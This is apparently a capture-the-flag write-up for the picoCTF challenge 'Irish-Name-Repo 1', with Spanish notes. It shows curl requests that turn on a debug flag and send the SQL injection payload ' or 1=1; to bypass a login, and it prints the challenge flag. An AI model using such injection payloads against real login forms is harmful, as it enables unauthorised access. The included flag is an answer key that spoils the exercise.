### Irish-Name-Repo 1
## Objetivo

There is a website running at `https://jupiter.challenges.picoctf.org/problem/39720/` ([link](https://jupiter.challenges.picoctf.org/problem/39720/)) or http://jupiter.challenges.picoctf.org:39720. Do you think you can log us in? Try to see if you can login!
## Solución
```bash
macbookair@MacBook-Air-de-Aletsis ~ % curl https://jupiter.challenges.picoctf.org/problem/39720/login.php

<h1>Login failed.</h1>%                                                         macbookair@MacBook-Air-de-Aletsis ~ % curl https://jupiter.challenges.picoctf.org/problem/39720/login.php -d "username=admin&password=hola&debug=1"

<pre>username: admin

password: hola

SQL query: SELECT * FROM users WHERE name='admin' AND password='hola'

</pre><h1>Login failed.</h1>%                                                                                                                  macbookair@MacBook-Air-de-Aletsis ~ % curl https://jupiter.challenges.picoctf.org/problem/39720/login.php -d "username=admin&password=' or 1=1;&debug=1" 

<pre>username: admin

password: ' or 1=1;

SQL query: SELECT * FROM users WHERE name='admin' AND password='' or 1=1;'

</pre><h1>Logged in!</h1><p>Your flag is: picoCTF{s0m3_SQL_c218b685}</p>%
```
## Notas adicionales

1. Entramos al link
2. Cliqueamos al menu de la parte superior izquierda
3. Entramos al adminLoggin
4. inspeccionamos la pagina
5. Habilitamos la opcion debuger con 1
6. En el username le ponemos "admin';", password "hola"
7. Nos da la bandera
## Bandera

picoCTF{s0m3_SQL_c218b685}
## Hints

- There doesn't seem to be many ways to interact with this. I wonder if the users are kept in a database?
- Try to think about how the website verifies your login.

## Referencia

https://www.w3schools.com/sql/sql_injection.asp
